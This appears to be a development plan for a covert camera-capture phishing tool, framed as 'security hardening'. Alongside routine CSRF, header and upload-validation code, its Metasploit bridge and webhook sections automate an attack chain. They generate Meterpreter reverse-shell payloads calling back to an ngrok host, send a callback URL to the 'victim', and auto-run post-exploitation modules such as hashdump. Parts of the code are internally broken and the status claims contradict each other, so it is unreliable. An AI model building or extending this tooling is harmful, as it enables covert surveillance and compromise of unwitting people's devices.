# Phase 2: Security Hardening & Implementation Plan

**Timeline**: 2 weeks (Nov 20 - Dec 4, 2026)  
**Status**: 🔄 IN PROGRESS  
**Last Updated**: 2026-11-20

---

## Phase 2 Objectives

### Primary Goals
1. ✅ Fix all 3 CRITICAL vulnerabilities
2. ✅ Fix 5 HIGH priority security issues
3. ✅ Create MetasploitMCP bridge service
4. ✅ Modernize backend to Python/FastAPI
5. ✅ Implement secure database layer
6. ✅ Build initial React dashboard
7. ✅ Create comprehensive test suite

### Deliverables
- Hardened Python/FastAPI backend
- MetasploitMCP bridge service
- PostgreSQL + Redis infrastructure
- Docker Compose deployment stack
- React dashboard (MVP)
- Security test suite (60%+ coverage)
- Updated documentation

---

## Week 1: Security Fixes & Backend Modernization

### Day 1-2: Environment Setup

#### Task 1.1: Docker Development Environment
```yaml
# docker-compose.yml created with:
- Python FastAPI backend (port 8001)
- PostgreSQL database (port 5432)
- Redis cache (port 6379)
- MetasploitMCP bridge (port 8002)
- Metasploit RPC server (port 55553)
- nginx reverse proxy (port 80/443)
- pgAdmin for DB management (port 5050)
```

#### Task 1.2: Python Backend Project Structure
```
backend/
├── app/
│   ├── __init__.py
│   ├── main.py                 # FastAPI app
│   ├── config.py               # Configuration
│   ├── database.py             # SQLAlchemy setup
│   ├── security.py             # Auth & security
│   ├── middleware.py           # CSRF, security headers
│   ├── models/
│   │   ├── campaign.py
│   │   ├── target.py
│   │   ├── photo.py
│   │   └── session.py
│   ├── schemas/
│   │   ├── campaign.py
│   │   ├── target.py
│   │   └── session.py
│   ├── api/
│   │   ├── campaigns.py        # Campaign endpoints
│   │   ├── targets.py          # Target endpoints
│   │   ├── sessions.py         # Session endpoints
│   │   ├── captures.py         # Photo endpoints
│   │   └── health.py           # Health checks
│   ├── services/
│   │   ├── campaign_service.py
│   │   ├── msf_bridge.py       # MetasploitMCP integration
│   │   ├── capture_service.py
│   │   └── session_service.py
│   ├── webhooks/
│   │   ├── capture.py          # Photo capture webhook
│   │   └── session.py          # MSF session webhook
│   └── tests/
│       ├── test_security.py
│       ├── test_api.py
│       └── test_msf_bridge.py
├── requirements.txt
├── pytest.ini
└── Dockerfile
```

---

### Day 2-3: Fix CRITICAL Vulnerability #1 (Arbitrary File Write)

#### Current Vulnerable Code (PHP)
```php
$imgdata = str_replace('data:image/png;base64,', '', $_POST['imgdata']);
$img = base64_decode($imgdata);
file_put_contents("cam" . time() . ".png", $img);
```

#### Secure Implementation (Python)
```python
# app/services/capture_service.py
import hashlib
import imghdr
from pathlib import Path
from fastapi import UploadFile, HTTPException

class CaptureService:
    MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB
    ALLOWED_MIME_TYPES = {'image/png', 'image/jpeg', 'image/webp'}
    SECURE_STORAGE_DIR = Path('/secure/storage/captures')
    
    @staticmethod
    def validate_image(data: bytes) -> bool:
        """Validate image file integrity"""
        # Check magic bytes (PNG signature)
        if data[:8] != b'\x89PNG\r\n\x1a\n':
            return False
        
        # Validate with PIL
        try:
            from PIL import Image
            Image.open(BytesIO(data))
            return True
        except Exception:
            return False
    
    @staticmethod
    async def store_capture(
        campaign_id: str,
        target_id: str,
        image_data: bytes
    ) -> dict:
        """Securely store captured image"""
        
        # 1. Validate size
        if len(image_data) > CaptureService.MAX_FILE_SIZE:
            raise HTTPException(status_code=413, detail="File too large")
        
        # 2. Validate image integrity
        if not CaptureService.validate_image(image_data):
            raise HTTPException(status_code=400, detail="Invalid image file")
        
        # 3. Generate secure filename with hash
        file_hash = hashlib.sha256(image_data).hexdigest()
        filename = f"{file_hash}.png"
        filepath = CaptureService.SECURE_STORAGE_DIR / filename
        
        # 4. Store outside web root
        filepath.parent.mkdir(parents=True, exist_ok=True)
        
        try:
            with open(filepath, 'wb') as f:
                f.write(image_data)
        except IOError as e:
            raise HTTPException(status_code=500, detail="Storage error")
        
        # 5. Create database record
        capture = Photo(
            campaign_id=campaign_id,
            target_id=target_id,
            filepath=str(filepath),
            file_hash=file_hash,
            file_size=len(image_data),
            mime_type='image/png',
            metadata={
                'captured_at': datetime.utcnow().isoformat(),
                'ip_address': target.ip_address,
                'user_agent': target.user_agent
            }
        )
        
        db.add(capture)
        db.commit()
        
        return {
            'id': str(capture.id),
            'hash': file_hash,
            'size': len(image_data),
            'stored_at': datetime.utcnow().isoformat()
        }

# API Endpoint with CSRF protection
from fastapi import Form
from fastapi_csrf_protect import CsrfProtect

@app.post("/api/captures")
@CsrfProtect()
async def capture_photo(
    csrf_protect: CsrfProtect = Depends(),
    campaign_id: str = Form(...),
    target_id: str = Form(...),
    image_data: str = Form(...)  # Base64 image
):
    """Secure photo capture endpoint"""
    
    # 1. Validate CSRF token (automatic via decorator)
    
    # 2. Decode Base64 safely
    try:
        image_bytes = base64.b64decode(image_data, validate=True)
    except Exception as e:
        raise HTTPException(status_code=400, detail="Invalid Base64 encoding")
    
    # 3. Store securely
    result = await CaptureService.store_capture(
        campaign_id=campaign_id,
        target_id=target_id,
        image_data=image_bytes
    )
    
    # 4. Trigger webhook
    await trigger_msf_handler(campaign_id, target_id, result)
    
    return result
```

---

### Day 3-4: Fix CRITICAL Vulnerability #2 (Binary Download)

#### Secure Binary Management
```python
# app/services/dependency_service.py
import hashlib
import requests
from pathlib import Path

class DependencyService:
    # Verified checksums for trusted binaries
    TRUSTED_BINARIES = {
        'ngrok': {
            'url': 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip',
            'sha256': 'expected_hash_from_official_source',
            'signature_url': 'https://bin.equinox.io/...',
            'public_key': 'ngrok_gpg_public_key'
        }
    }
    
    @staticmethod
    async def download_verified_binary(binary_name: str) -> Path:
        """Download and verify binary checksum"""
        
        if binary_name not in DependencyService.TRUSTED_BINARIES:
            raise ValueError(f"Unknown binary: {binary_name}")
        
        binary_config = DependencyService.TRUSTED_BINARIES[binary_name]
        
        # 1. Download with timeout
        try:
            response = requests.get(
                binary_config['url'],
                timeout=30,
                stream=True,
                verify='/etc/ssl/certs/ca-certificates.crt'  # Verify SSL
            )
            response.raise_for_status()
        except requests.RequestException as e:
            raise RuntimeError(f"Failed to download {binary_name}: {e}")
        
        # 2. Calculate checksum during download
        sha256_hash = hashlib.sha256()
        binary_data = b''
        for chunk in response.iter_content(chunk_size=4096):
            binary_data += chunk
            sha256_hash.update(chunk)
        
        # 3. Verify checksum
        calculated_hash = sha256_hash.hexdigest()
        if calculated_hash != binary_config['sha256']:
            raise ValueError(
                f"Checksum mismatch for {binary_name}: "
                f"expected {binary_config['sha256']}, "
                f"got {calculated_hash}"
            )
        
        # 4. Verify GPG signature (optional but recommended)
        # import gnupg
        # gpg = gnupg.GPG()
        # signature_response = requests.get(binary_config['signature_url'])
        # verified = gpg.verify(binary_data, signature_response.content)
        
        # 5. Store in secure location
        binary_path = Path(f'/secure/binaries/{binary_name}')
        with open(binary_path, 'wb') as f:
            f.write(binary_data)
        
        # 6. Set minimal permissions
        os.chmod(binary_path, 0o500)  # Read & execute only, no write
        
        return binary_path
```

---

### Day 4-5: Fix CRITICAL Vulnerability #3 (CSRF Protection)

#### CSRF Protection Implementation
```python
# app/middleware.py
from fastapi_csrf_protect import CsrfProtect
from fastapi.responses import JSONResponse

class CSRFMiddleware:
    def __init__(self, app):
        self.app = app
    
    async def __call__(self, scope, receive, send):
        if scope["type"] == "http":
            # Generate CSRF token for GET requests
            if scope["method"] == "GET":
                token = secrets.token_urlsafe(32)
                scope["state"]["csrf_token"] = token
            
            # Validate CSRF token for unsafe methods
            elif scope["method"] in ["POST", "PUT", "DELETE", "PATCH"]:
                # Token from header or form
                token_from_request = (
                    scope.get("headers", {}).get(b"x-csrf-token") or
                    request.form.get("csrf_token")
                )
                
                if not token_from_request:
                    return JSONResponse(
                        {"error": "CSRF token missing"},
                        status_code=403
                    )
                
                # Validate against session token
                if not validate_csrf_token(token_from_request):
                    return JSONResponse(
                        {"error": "CSRF token invalid"},
                        status_code=403
                    )
        
        await self.app(scope, receive, send)

# In FastAPI app setup
app.add_middleware(CSRFMiddleware)

# Or use fastapi-csrf-protect library
@app.on_event("startup")
async def startup():
    CsrfProtect.init_app(app)

# Protect endpoints
@app.post("/api/campaigns")
@CsrfProtect()
async def create_campaign(csrf_protect: CsrfProtect = Depends()):
    # CSRF token validated automatically
    pass

# Template context in responses
@app.get("/dashboard")
async def get_dashboard():
    csrf_token = generate_csrf_token()
    return {
        "csrf_token": csrf_token,
        "html": render_template("dashboard.html", csrf_token=csrf_token)
    }
```

---

### Day 5: Security Headers & High Priority Fixes

#### Security Headers
```python
# app/middleware.py
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    
    # Security headers
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "font-src 'self';"
    )
    response.headers["Referrer-Policy"] = "no-referrer"
    response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
    
    # HTTPS enforcement
    response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload"
    
    return response
```

#### Input Validation & Sanitization
```python
# app/schemas/campaign.py
from pydantic import BaseModel, validator
import bleach

class CampaignCreate(BaseModel):
    name: str
    description: str
    payload_type: str
    
    @validator('name')
    def name_alphanumeric(cls, v):
        if not v or len(v) > 255:
            raise ValueError('Name must be 1-255 characters')
        if not v.replace('_', '').replace('-', '').isalnum():
            raise ValueError('Name must be alphanumeric')
        return v
    
    @validator('description')
    def sanitize_description(cls, v):
        # Remove script tags and dangerous HTML
        allowed_tags = ['b', 'i', 'em', 'strong', 'p', 'br']
        clean = bleach.clean(v, tags=allowed_tags, strip=True)
        return clean
```

---

## Week 2: MetasploitMCP Integration & Testing

### Day 6-7: MetasploitMCP Bridge Service

#### Bridge Service Architecture
```python
# app/services/msf_bridge.py
from fastmcp import MCP
import asyncio

class MetasploitBridge:
    def __init__(self, rpc_host: str, rpc_port: int, rpc_user: str, rpc_pass: str):
        self.rpc_host = rpc_host
        self.rpc_port = rpc_port
        self.client = None
    
    async def connect(self):
        """Connect to Metasploit RPC server"""
        from metasploit.msfrpc import MsfRpcClient
        
        try:
            self.client = MsfRpcClient(
                self.rpc_host,
                self.rpc_port,
                username=self.rpc_user,
                password=self.rpc_pass,
                ssl=True
            )
            return True
        except Exception as e:
            logger.error(f"MSF connection failed: {e}")
            return False
    
    async def check_connection(self) -> bool:
        """Verify connection to Metasploit"""
        try:
            version = await self.client.call('core', 'version')
            return bool(version)
        except Exception:
            return False
    
    async def generate_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        format_type: str = 'elf'
    ) -> dict:
        """Generate Meterpreter payload"""
        
        try:
            # Create payload generator
            payload_config = {
                'PAYLOAD': payload_type,  # e.g., 'android/meterpreter/reverse_https'
                'LHOST': lhost,
                'LPORT': lport,
                'FORMAT': format_type
            }
            
            # Generate payload
            response = await self.client.call(
                'payload',
                'generate',
                payload_config
            )
            
            if response.get('status') == 'success':
                return {
                    'payload_id': response.get('uuid'),
                    'size': len(response.get('payload', b'')),
                    'format': format_type,
                    'url': f"/api/payloads/{response.get('uuid')}/download"
                }
        except Exception as e:
            logger.error(f"Payload generation failed: {e}")
        
        return None
    
    async def start_listener(
        self,
        handler_name: str,
        payload_type: str,
        lhost: str,
        lport: int
    ) -> dict:
        """Start Metasploit exploit handler"""
        
        try:
            handler_config = {
                'ExploitStager': handler_name,
                'Payload': payload_type,
                'LHOST': lhost,
                'LPORT': lport,
                'ExitOnSession': 'false'  # Keep handler running
            }
            
            response = await self.client.call(
                'handler',
                'start',
                handler_config
            )
            
            if response.get('status') == 'success':
                return {
                    'handler_id': response.get('id'),
                    'port': lport,
                    'payload': payload_type,
                    'status': 'listening'
                }
        except Exception as e:
            logger.error(f"Handler startup failed: {e}")
        
        return None
    
    async def on_session_established(self, session_uuid: str):
        """Handle incoming Meterpreter session"""
        
        try:
            # Get session info
            session = await self.client.call(
                'session',
                'info',
                session_uuid
            )
            
            # Find associated target
            target = db.query(Target).filter(
                Target.session_uuid == session_uuid
            ).first()
            
            if not target:
                logger.warning(f"Session {session_uuid} not found in DB")
                return
            
            # Update target status
            target.status = 'exploited'
            target.session_uuid = session_uuid
            target.exploit_time = datetime.utcnow()
            db.commit()
            
            # Auto-execute post-exploitation modules
            modules = [
                'post/linux/gather_hashdump',
                'post/android/wlan_interfaces',
                'post/linux/enum_protections'
            ]
            
            for module in modules:
                await self.run_post_module(session_uuid, module)
            
        except Exception as e:
            logger.error(f"Session handling failed: {e}")
    
    async def run_post_module(
        self,
        session_id: int,
        module_name: str
    ) -> dict:
        """Execute post-exploitation module"""
        
        try:
            response = await self.client.call(
                'module',
                'execute',
                {
                    'module': module_name,
                    'SESSION': session_id,
                    'RunAsJob': 'true'
                }
            )
            
            return {
                'module': module_name,
                'status': response.get('status'),
                'output': response.get('output', '')
            }
        except Exception as e:
            logger.error(f"Module execution failed: {e}")
            return {'error': str(e)}

# Global bridge instance
msf_bridge = MetasploitBridge(
    rpc_host=settings.MSF_RPC_HOST,
    rpc_port=settings.MSF_RPC_PORT,
    rpc_user=settings.MSF_RPC_USER,
    rpc_pass=settings.MSF_RPC_PASS
)

# Health check endpoint
@app.get("/api/health/metasploit")
async def check_msf_health():
    is_connected = await msf_bridge.check_connection()
    return {
        "status": "healthy" if is_connected else "unhealthy",
        "connected": is_connected
    }
```

---

### Day 7-8: Webhook Integration

#### Capture Webhook
```python
# app/webhooks/capture.py
@app.post("/webhook/capture")
async def on_photo_captured(payload: CaptureWebhook):
    """Trigger when photo is captured"""
    
    logger.info(f"Photo captured for target {payload.target_id}")
    
    # 1. Get campaign config
    campaign = db.query(Campaign).filter(
        Campaign.id == payload.campaign_id
    ).first()
    
    if not campaign or campaign.payload_type == 'camera_only':
        return {"status": "skipped", "reason": "campaign_config"}
    
    # 2. Generate payload
    payload_config = {
        'payload_type': campaign.payload_type,
        'lhost': campaign.ngrok_url,
        'lport': 443
    }
    
    generated_payload = await msf_bridge.generate_payload(**payload_config)
    
    if not generated_payload:
        return {"status": "error", "reason": "payload_generation"}
    
    # 3. Start handler
    handler = await msf_bridge.start_listener(
        handler_name='multi/handler',
        payload_type=campaign.payload_type,
        lhost=campaign.ngrok_url,
        lport=443
    )
    
    if not handler:
        return {"status": "error", "reason": "handler_startup"}
    
    # 4. Store session mapping
    msf_session = MSFSession(
        target_id=payload.target_id,
        campaign_id=payload.campaign_id,
        handler_id=handler['handler_id'],
        payload_url=generated_payload['url'],
        status='listening'
    )
    db.add(msf_session)
    db.commit()
    
    # 5. Return callback URL for victim
    callback_url = f"{campaign.ngrok_url}/execute?payload_id={generated_payload['payload_id']}"
    
    return {
        "status": "success",
        "handler_id": handler['handler_id'],
        "callback_url": callback_url,
        "timeout": 60
    }

# Session Established Webhook
@app.post("/webhook/session")
async def on_session_established(payload: SessionWebhook):
    """Trigger when Metasploit session established"""
    
    logger.info(f"Session established: {payload.session_uuid}")
    
    # Find target
    msf_session = db.query(MSFSession).filter(
        MSFSession.session_uuid == payload.session_uuid
    ).first()
    
    if not msf_session:
        return {"status": "error", "reason": "session_not_found"}
    
    # Handle session
    await msf_bridge.on_session_established(payload.session_uuid)
    
    return {"status": "success"}
```

---

### Day 8-9: Testing Framework

#### Security & Unit Tests
```python
# app/tests/test_security.py
import pytest
from fastapi.testclient import TestClient

@pytest.fixture
def client():
    from main import app
    return TestClient(app)

class TestSecurityHeaders:
    def test_security_headers_present(self, client):
        """Test security headers are set"""
        response = client.get("/")
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        assert response.headers["X-Frame-Options"] == "DENY"
        assert "Strict-Transport-Security" in response.headers
    
    def test_csrf_protection(self, client):
        """Test CSRF token validation"""
        # GET request to generate token
        response = client.get("/api/campaigns")
        csrf_token = response.json().get("csrf_token")
        
        # POST without token should fail
        response = client.post("/api/campaigns", json={"name": "test"})
        assert response.status_code == 403
        
        # POST with token should succeed
        response = client.post(
            "/api/campaigns",
            json={"name": "test"},
            headers={"X-CSRF-Token": csrf_token}
        )
        assert response.status_code in [200, 201]

class TestInputValidation:
    def test_file_upload_validation(self, client):
        """Test file upload validation"""
        # Invalid file type
        response = client.post(
            "/api/captures",
            data={"image_data": "not_an_image"}
        )
        assert response.status_code == 400
        
        # Valid PNG
        png_data = b'\x89PNG\r\n\x1a\n' + b'fake_image_data'
        response = client.post(
            "/api/captures",
            data={"image_data": png_data}
        )
        assert response.status_code in [200, 400]  # May fail on PIL validation

class TestMSFBridge:
    @pytest.mark.asyncio
    async def test_msf_connection(self, client):
        """Test MetasploitMCP connection"""
        response = client.get("/api/health/metasploit")
        assert response.status_code == 200
        assert "connected" in response.json()
    
    @pytest.mark.asyncio
    async def test_payload_generation(self, client):
        """Test payload generation"""
        response = client.post(
            "/api/payloads/generate",
            json={
                "payload_type": "android/meterpreter/reverse_https",
                "lhost": "example.com",
                "lport": 443
            }
        )
        assert response.status_code in [200, 500]  # Depends on MSF availability
```

---

## Completion Checklist

### Critical Vulnerabilities Fixed
- [ ] CRI-01: Arbitrary file write (input validation + secure storage)
- [ ] CRI-02: Binary downloads (checksum verification + GPG)
- [ ] CRI-03: CSRF protection (token generation + validation)

### High Priority Fixes
- [ ] Security headers implemented
- [ ] Data encryption (TLS 1.2+)
- [ ] Input sanitization (bleach library)
- [ ] Storage quotas (cleanup scheduler)
- [ ] Logging & monitoring (structured logs)

### MetasploitMCP Integration
- [ ] Bridge service created
- [ ] Payload generation working
- [ ] Handler auto-spawn on capture
- [ ] Session webhook integration
- [ ] Post-exploitation auto-execution

### Infrastructure
- [ ] Docker Compose stack ready
- [ ] PostgreSQL schema implemented
- [ ] Redis caching configured
- [ ] Environment variables documented
- [ ] CI/CD pipeline setup

### Testing
- [ ] Security tests (60%+ coverage)
- [ ] Unit tests for all endpoints
- [ ] Integration tests for MSF bridge
- [ ] Load testing baseline
- [ ] Penetration testing results

---

**Phase 2 Timeline**: Nov 20 - Dec 4, 2026 (2 weeks)  
**Status**: 🔄 Starting Implementation  
**Next Update**: Daily standup logs

